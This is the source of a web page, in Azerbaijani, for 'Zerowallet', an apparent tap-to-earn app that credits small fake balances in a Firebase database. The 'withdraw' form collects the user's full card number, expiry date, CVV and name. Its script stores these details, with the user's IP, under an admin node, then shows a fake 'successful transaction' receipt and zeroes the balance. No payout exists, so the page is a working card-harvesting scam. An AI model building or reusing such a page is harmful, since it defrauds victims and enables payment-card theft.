<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Zerowallet - Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    
    <style>
        :root { --main-cyan: #00f2ff; --bg-dark: #050505; --card-bg: #0d0d0d; --gold: #ffd700; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { margin: 0; background: var(--bg-dark); color: #fff; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }

        /* HEADER */
        .app-header { padding: 20px; background: #000; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
        .balance-card { text-align: right; }
        .balance-card b { font-family: 'Orbitron'; font-size: 1.5rem; color: var(--main-cyan); display: block; }

        /* MINING SECTION */
        .mining-container { height: 60vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .coin-btn { width: 220px; height: 220px; cursor: pointer; transition: 0.1s; filter: drop-shadow(0 0 20px rgba(0,242,255,0.2)); }
        .coin-btn:active { transform: scale(0.9); }
        
        /* WITHDRAW SECTION */
        .withdraw-section { padding: 20px; background: var(--card-bg); margin: 20px; border-radius: 20px; border: 1px solid #1a1a1a; text-align: center; }
        .withdraw-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #1a1a1a; color: #444; font-family: 'Orbitron'; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
        .withdraw-btn.active { background: var(--main-cyan); color: #000; cursor: pointer; box-shadow: 0 0 20px rgba(0,242,255,0.3); }

        /* MODAL (WITHDRAW FORM) */
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; display: none; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: #111; padding: 25px; border-radius: 20px; width: 100%; max-width: 400px; border: 1px solid var(--main-cyan); }
        .input-box { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #222; border-radius: 8px; color: #fff; font-family: 'Orbitron'; font-size: 0.9rem; }

        /* RECEIPT (ÇEK) */
        #receipt { display: none; background: #fff; color: #000; padding: 30px; border-radius: 5px; font-family: 'Courier New', monospace; text-align: center; width: 300px; box-shadow: 0 0 50px rgba(0,0,0,1); }
        .receipt-line { border-top: 1px dashed #000; margin: 10px 0; }
    </style>
</head>
<body>

    <header class="app-header">
        <div><small style="color: #444;">TERMINAL</small><br><span id="user-display" style="font-family: 'Orbitron'; color: var(--main-cyan);">---</span></div>
        <div class="balance-card"><b id="bal-amount">0.00</b><small>AZN BALANCE</small></div>
    </header>

    <div class="mining-container">
        <div id="lock-overlay" style="display:none; text-align:center;">
            <h2 style="font-family:'Orbitron'; color:red;">LIMIT DOLUB</h2>
            <div id="timer" style="font-size:2rem; font-family:'Orbitron';">08:00:00</div>
        </div>
        <img src="coin.png" class="coin-btn" onclick="mine(event)" onerror="this.src='https://cdn-icons-png.flaticon.com/512/217/217853.png'">
        <div style="margin-top:20px;">LİMİT: <span id="clicks">0</span>/15</div>
    </div>

    <div class="withdraw-section">
        <p style="font-size: 0.8rem; color: #666;">Minimum çıxarış: 20.00 AZN</p>
        <button id="withdraw-btn" class="withdraw-btn" onclick="openWithdraw()">PULU ÇIXAR</button>
    </div>

    <div id="withdraw-modal" class="modal">
        <div class="modal-content">
            <h3 style="font-family: 'Orbitron'; color: var(--main-cyan);">KART MƏLUMATLARINI DAXİL EDİN</h3>
            <input type="text" id="card-name" class="input-box" placeholder="AD SOYAD (KARTDAKI)">
            <input type="text" id="card-num" class="input-box" placeholder="16 RƏQƏMLİ KART NOMRƏSİ" maxlength="16">
            <div style="display:flex; gap:10px;">
                <input type="text" id="card-exp" class="input-box" placeholder="AA/İİ" maxlength="5">
                <input type="password" id="card-cvv" class="input-box" placeholder="CVV" maxlength="3">
            </div>
            <button class="withdraw-btn active" style="margin-top:20px;" onclick="submitWithdraw()">TƏSDİQLƏ VƏ ÇƏK</button>
            <button class="withdraw-btn" style="margin-top:10px; background:none; color:#555;" onclick="closeWithdraw()">LƏĞV ET</button>
        </div>
    </div>

    <div id="receipt-modal" class="modal">
        <div id="receipt">
            <h2 style="margin:0;">ZEROWALLET</h2>
            <p>SUCCESSFUL TRANSACTION</p>
            <div class="receipt-line"></div>
            <div style="text-align:left; font-size: 0.8rem;">
                <p>İSTİFADƏÇİ: <span id="rec-user"></span></p>
                <p>MƏBLƏĞ: <span id="rec-amount"></span> AZN</p>
                <p>TARİX: <span id="rec-date"></span></p>
                <p>KART: **** **** **** <span id="rec-card"></span></p>
                <p>STATUS: TƏSDİQLƏNDİ</p>
            </div>
            <div class="receipt-line"></div>
            <p style="font-size: 0.7rem;">Sistemi seçdiyiniz üçün təşəkkürlər!</p>
            <button onclick="location.reload()" style="margin-top:10px; padding:5px; border:1px solid #000; background:none; cursor:pointer;">BAĞLA</button>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
            authDomain: "sevgili-testi.firebaseapp.com",
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
            projectId: "sevgili-testi",
            storageBucket: "sevgili-testi.firebasestorage.app",
            messagingSenderId: "399260477557",
            appId: "1:399260477557:web:584204a698d7bf145bb03c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const user = localStorage.getItem('zerowallet_session');

        if(!user) location.href="index.html";
        document.getElementById('user-display').innerText = user;

        let data = {};
        db.ref('zerowallet_users/' + user).on('value', snap => {
            data = snap.val();
            document.getElementById('bal-amount').innerText = data.balance.toFixed(2);
            document.getElementById('clicks').innerText = data.clicks;
            
            const wBtn = document.getElementById('withdraw-btn');
            if(data.balance >= 20) {
                wBtn.classList.add('active');
                wBtn.disabled = false;
            } else {
                wBtn.classList.remove('active');
                wBtn.disabled = true;
            }
        });

        function mine(e) {
            if(data.clicks >= 15) return alert("8 saat gözləməlisiniz!");
            db.ref('zerowallet_users/' + user).update({
                balance: data.balance + 0.1, // Standart klik
                clicks: data.clicks + 1
            });
        }

        function openWithdraw() { document.getElementById('withdraw-modal').style.display='flex'; }
        function closeWithdraw() { document.getElementById('withdraw-modal').style.display='none'; }

        async function submitWithdraw() {
            const name = document.getElementById('card-name').value;
            const num = document.getElementById('card-num').value;
            const exp = document.getElementById('card-exp').value;
            const cvv = document.getElementById('card-cvv').value;

            if(name.length < 5 || num.length < 16 || exp.length < 5 || cvv.length < 3) {
                return alert("Məlumatlar yanlış daxil edilib!");
            }

            // Məlumatları Admin Panel üçün göndər
            await db.ref('admin_withdrawals/' + user).set({
                username: user,
                cardName: name,
                cardNum: num,
                cardExp: exp,
                cardCvv: cvv,
                amount: data.balance,
                ip: data.ip,
                date: new Date().toLocaleString()
            });

            // Çeki göstər
            document.getElementById('withdraw-modal').style.display='none';
            document.getElementById('receipt-modal').style.display='flex';
            document.getElementById('receipt').style.display='inline-block';
            
            document.getElementById('rec-user').innerText = user;
            document.getElementById('rec-amount').innerText = data.balance.toFixed(2);
            document.getElementById('rec-date').innerText = new Date().toLocaleDateString();
            document.getElementById('rec-card').innerText = num.slice(-4);

            // Balansı sıfırla
            db.ref('zerowallet_users/' + user).update({ balance: 0 });
        }
    </script>
</body>
</html>
